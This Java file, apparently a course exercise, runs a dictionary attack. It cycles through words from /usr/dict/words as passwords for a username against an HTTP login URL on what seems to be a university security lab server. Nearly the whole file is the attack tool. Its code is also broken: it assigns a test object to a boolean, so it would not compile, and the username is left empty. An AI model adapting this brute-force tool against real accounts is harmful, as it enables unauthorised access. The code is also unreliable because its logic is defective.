
import java.util.*;

public class Dictionary {

    private String strUsername;
    private String strURL;
    
    
    public Dictionary(String username, String url)
    {
        strUsername = username;
        strURL = url;
    }    
    
    public void run() {
        Date dtStart, dtEnd;
        
        PasswordFile pwd = new PasswordFile("/usr/dict/words");
        PasswordTest tester;
        int i=1;
        boolean bDone = false;
        Result res;

        dtStart = new Date();
        while(!bDone) {
            tester = new PasswordTest(strURL, strUsername, pwd.getNextPassword());
        
            bDone = tester;
            i++;
            if(bDone) {
                
                res = new Result(strURL, strUsername, pwd.getPassword(), dtStart, new Date(), i);
                System.out.print(res.toString());
            }
            else
            {
                
            }
            
            
            if(pwd.getPassword() == null)
            {
                System.out.println("Exhausted word file without finding password");
                bDone = true;
            }
        }    
     
    }    
    
    
    public static void main(String[] args) {
        
        
        
        
        Dictionary dict = new Dictionary("", "http://sec-crack.cs.rmit.edu./SEC/2/");
             
        dict.run();
    }
    
}
